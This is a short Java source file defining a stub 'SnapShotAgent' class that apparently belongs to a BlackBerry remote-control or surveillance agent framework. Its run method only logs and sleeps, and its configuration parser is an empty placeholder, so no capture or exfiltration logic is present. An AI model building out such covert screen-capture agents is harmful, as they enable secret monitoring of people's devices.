package com.ht.rcs.blackberry.agent;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class SnapShotAgent extends Agent {
    static Debug debug = new Debug("SnapShotAgent", DebugLevel.VERBOSE);

    public SnapShotAgent(int AgentStatus) {
        super(Agent.AGENT_SNAPSHOT, AgentStatus, true);

    }

    protected SnapShotAgent(int AgentStatus, byte[] confParams) {
        this(AgentStatus);
        Parse(confParams);
    }

    public void AgentRun() {
        debug.trace("run");
        this.SleepUntilStopped();

    }

    protected boolean Parse(byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }

}
